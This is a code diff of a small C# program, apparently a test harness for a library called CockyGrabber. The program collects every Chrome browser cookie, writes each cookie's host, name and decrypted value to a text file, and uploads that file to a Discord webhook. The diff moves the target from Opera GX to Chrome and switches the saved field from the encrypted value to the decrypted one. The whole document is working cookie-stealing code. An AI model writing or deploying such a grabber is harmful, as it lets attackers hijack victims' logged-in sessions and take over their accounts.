@@ -7,7 +7,7 @@ using System.Net.Http;
 
 namespace CockyGrabberTest
 {
-    // This Program collects all OperaGx Cookies and sends them as a file to a discord webhook
+    // This Program collects all Chrome cookies and sends them as a file to a discord webhook
     class Program
     {
         private const string WebhookUrl = "YOUR WEBHOOK URL HERE";
@@ -34,16 +34,16 @@ namespace CockyGrabberTest
 
         static void Main(string[] args)
         {
-            OperaGxGrabber g = new OperaGxGrabber(); // Create Grabber
+            ChromeGrabber g = new ChromeGrabber(); // Create Grabber
             StringBuilder cookies = new StringBuilder();
 
             g.GetCookies().ToList().ForEach(delegate (Blink.Cookie c) // For every grabbed cookie:
             {
-                cookies.AppendLine($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
+                cookies.AppendLine($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.DecryptedValue}"); // Add the cookie hostname, name, and value to the 'cookies' list
             });
 
             File.WriteAllText("./cookies_save.txt", cookies.ToString()); // Save cookies in cookies_save.txt
-            SendFile(WebhookUrl, "./cookies_save.txt"); // Send the File to the Webhook
+            SendFile(WebhookUrl, "./cookies_save.txt"); // Send the file to the Webhook
         }
     }
 }
